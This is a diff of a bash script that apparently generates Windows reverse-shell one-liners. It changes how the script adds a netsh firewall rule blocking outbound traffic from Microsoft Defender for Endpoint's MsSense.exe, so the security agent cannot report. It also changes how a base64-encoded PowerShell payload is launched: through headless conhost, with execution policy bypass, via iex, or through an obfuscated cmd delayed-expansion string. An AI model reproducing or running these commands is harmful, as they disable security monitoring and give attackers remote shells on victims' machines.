@@ -674,8 +674,8 @@ fi
 #Block MSSense.exe (Defender 365/ATP)
 if [ $blockmssense == 1 ]
         then 
-            mssense="& netsh a f a r n=nonsense d=out a=block prog='%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe' e=yes"
-            mssenseps="start-process netsh -Argument [a,f,a,r,n=nonsense,d=out,a=block,prog='%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe',e=yes];"
+            mssense='& netsh a f a r n=nonsense d=out a=block prog="%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe" e=yes'
+            mssenseps='netsh a f a r n=nonsense d=out a=block prog="%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe" e=yes'
         else 
             mssense=""
             mssenseps=""
@@ -761,9 +761,17 @@ then
     then
         rev="conhost --headless $mssense powershell -noprofile -executionpolicy bypass -NoExit -e ${shell}\""
     elif [[ $poshinit == "powershell" ]]
-    then 
-        rev="powershell -c \"$mssenseps;powershell -noprofile -executionpolicy bypass -NoExit -e ${shell}\""
 
+    then 
+       
+        if [[ $mssenseps == "" ]]
+
+        then
+            
+            rev="iex ([string]([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"${shell}\"))))"
+        else
+            rev="$mssenseps ;iex ([string]([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"${shell}\"))))"
+        fi
     else
         rev="cmd /v /c \"set ${pwsh}=${pw_sh} && set ${space}=\" \" $mssense && call !${pwsh}!!${space}!${win}!${space}!-noprofile!${space}!-executionpolicy!${space}!bypass!${space}!-NoExit!${space}!-e!${space}!${shell}\""
     fi
